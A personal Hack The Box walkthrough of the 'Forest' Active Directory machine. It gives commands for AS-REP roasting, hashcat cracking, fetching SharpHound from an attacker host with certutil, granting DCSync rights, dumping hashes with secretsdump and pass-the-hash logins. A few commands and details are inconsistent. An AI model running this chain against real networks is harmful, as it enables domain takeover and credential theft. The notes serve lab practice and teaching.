UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49698]

[*] Received 311 endpoints.

```


# Foothold

- We know that svc-alfresco doesnt need pre-auth for kerberos - this means its vulnerable to asreproasting
	- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

```bash
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ impacket-GetNPUsers htb.local/ -dc-ip $IP                                                    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-02-13 17:30:24.349530  2019-09-23 07:09:47.931194  0x410200 



                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ impacket-GetNPUsers htb.local/svc-alfresco -dc-ip $IP -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ef2405d7be0b551ed384e5768b630e8b$666309a98238290f5622d5cdde91cb5e9630b2c26796f3e21f84560d926659538ef34b49e2680adeb73a203d827b437ac8aa70578c40510dfe247f15f7f3b2d55777018cfeedfbc191d39c03ad1c5ff049d2b666c2e892c15be612d92609e9bf3b48c39c2486e878575d3679b776532ff9ac88556cead3e437141e0d47a9e9a9071ee62b717369b8220d7826da2b13abc7ca3a32e3c870129bb16decb8d2e923db40c6dca02f90f44fe4b70fcbff976c5f462ca5f2efd85baaa805005c25db05ce3ec5c9a87d590601e14ea92d1a6f6fdaaf0758ff82c023a1e4fdac922fdccaff85aae8fa20

```

```bash
echo "$krb5asrep$23$svc-alfresco@HTB.LOCAL:02edf62c0a429041c31b90507b72b62b$a175de506e32f9ac50cc5972cca3e794d4417f6e5d16ddbb57cc068d98e3a7a12a4354af9086954ec3e3a3fa98e8a79487f9265459334e7f1c13909c3c40109cc0210997262409052a74ec7c6e42bc912325c0cd9e4fb449136469388532d8f2dd36389e09abab3bddc03641050d0022b5795eab057b4d2d615b54d300986e00bdb4f9747fcf664de615109f69877f38335ea16f77ac75bff14e634790fd7448d60c08f58abca2937767919b698460fbdf6c5376eea9ea49065c77561f18268e02e85d319617265d63c08ba3c010984c59a340c0ecd3884c4b63cdf25ea3e8e06b659c41290f" >> forest.hashes
```

### Cracking the Password Hash
- either copy the file or the hash to ur host, and crack it with hashcat - *significantly* faster on the host since it can utilize the GPU whereas the VM cant
- hashcat mode ![](Pasted%20image%2020230213152959.png)
	- https://hashcat.net/wiki/doku.php?id=example_hashes
- `./hashcat.exe -m 18200 -a 0 .\hashes\forest.hash .\rockyou.txt`
	- -m: Select the mode to be used when cracking - this is determined by the hash type
	- -a: The type of attack to use. 0 is a simple dictionary attack which then uses the supplied wordlist (rockyou.txt). [Attack modes](https://hashcat.net/wiki/#core_attack_modes)
- ![](Pasted%20image%2020230213153328.png)
- The password for `svc-alfresco` is `s3rvice`
	- **Good practice to blast creds out against the network using crackmapexec**
- ![](Pasted%20image%2020230213153858.png)
- ![](Pasted%20image%2020230213154012.png)

# Local privesc
- We now have a reliable connection to the host and can execute code - time to start local enumeration.
- run linpeas and look it over - nothing interesting....
	- move onto AD enumeration

### Active Directory Enumeration
- You will need to stand up [Bloodhound & neo4j](https://github.com/BloodHoundAD/BloodHound) to view active directory in a graph
	- `sudo /usr/bin/neo4j start ` and then `bloodhound` in terminal
- Bloodhound needs an **aggregator** to pull down the active directory layout of the victim - theres a [few ways](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound) to do this, but we'll use [SharpHound](https://github.com/BloodHoundAD/SharpHound)
	- On kali from a directory containing sharphound (preferably all your tools), run `python3 -m http.server 80`
	- On the victim (winrm shell) run `certutil -urlcache -split -f http://KALI_IP/SharpHound.exe`
		- You can pull `wget` to the victim since its easier to type (Ex. `wget KALI_IP/SharpHound.exe`)
	- ![](Pasted%20image%2020230213192611.png)
	- ![](Pasted%20image%2020230213192618.png)
- Running `SharpHound` will result in a `.zip` and `.bin` of which we only **really** need the `.zip`. Theres a few ways to move this like setting up a smb server on kali and transferring the file but this method would be fairly obviously abnormal behavior and stick out in system logs (not that we've been stealthy so far).
	- Instead we will b64 encode the file, `cat` it, and then copy paste it into a kali terminal to a file.
	- `certutil -encode "YOUR_BASE64_TEXT" | base64 -d > forest-ad.zip`
	- **Alternatively** to transfer over SMB....
		- On kali, standup a smb share with `impacket-smbserver shareName sharePath`
			- ![](Pasted%20image%2020230213194246.png)
		- On victim, connect to the share with `net use z: \\$IP\shareName`. Then you can navigate to `z:` or whatever you used, and copy files from windows to this directory. Files copied to here will be transferred to kali.
			- ![](Pasted%20image%2020230213194237.png)
### Navigating bloodhound graph
- Once we succesfully copy over the `.zip` of the AD domain, drag and drop the file into the bloodhound window opened earlier. Then in the search bar, search `svc-alfresco` and mark the user as owned since we have credentials.
- ![](Pasted%20image%2020230213194832.png)
- spooky
- ![](Pasted%20image%2020230213194848.png)
- What we're ultimately after in an AD environment are domain admin accounts. These accounts would give us unparalleled access across the domain. As such, start by searching for `Shortest Paths to Domain Admins from Owned Principals` under the analysis tab. This will generate a search starting with `svc-alfresco` and show the relations that could lead us to domain admin access.
- ![](Pasted%20image%2020230213195026.png)
- This graph shows `svc-alfresco` as a member of the `Service Accounts` group, which is a member of the `Privileged IT` group, which is a member of the `Account Operator` group and so on. The key issue here is that  Account Operators have [GenericAll](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) permissions over the `Exchange Windows Permissions` group, which in turn has `WriteDACL` permissions. These two misconfigurations will allow `svc-alfresco` to leverage full rights to the `Exchange Windows Permissions` group to modify and gain full control of an object through `WriteDACL`.
	- [Account Operator](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators) group also grants limited account creation capabilities
- The vector now is to leverage our GenericAll perms (granted by the Account Operator group) to modify the [AD  DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) using the WriteDACL perm granted by Exchange Windows Permissions group to give `svc-alfresco` [DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync) permissions

# Killchain
- Create the malicious admin user
- ![](Pasted%20image%2020230213200305.png)
- Add it to the Exchange Windows permissions group so it can modify the `htb.local` Domain DACL
- ![](Pasted%20image%2020230213200513.png)
- `$pass = convertto-securestring 'password' -AsPlainText -Force`
- `$cred = New-Object System.management.Automation.PSCredential('htb\pj_pentester', $pass)`
- `Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync`
- On kali, we will now use this new user to dump the user hashes of the domain with `secretsdump` from impacket
	- `impacket-secretsdump htb.local/pj_pentester:password@10.129.210.137`
	- ![](Pasted%20image%2020230213202849.png)
- Most important from the dump is the `htb.local\Administrator` - this is a domain scoped admin account.
	- ![](Pasted%20image%2020230213202932.png)
- We can now run a [pass the hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying) using `crackmapexec` - we confirm that this works by testing smb
- ![](Pasted%20image%2020230213203106.png)
	- With this, we can now get access with these creds through psexec
		- **Hint:** Use all 0s ahead of the hash - TODO: explain
	- ![](Pasted%20image%2020230213203428.png)
	- Domain owned
- #### Example - metasploit modules
- Instead of using an impacket script to connect to the box, its possible to use metasploit to perform the same task.
- Steps:
	- Launch with `msfconsole`
	- `search psexec`
	- ![](Pasted%20image%2020230213203654.png)
	- `use 4`
	- `show options` will display all of the required values that need to be set for a particular exploit
	- ![](Pasted%20image%2020230213204200.png)
	- ![](Pasted%20image%2020230213204113.png)
	- ![](Pasted%20image%2020230213204242.png)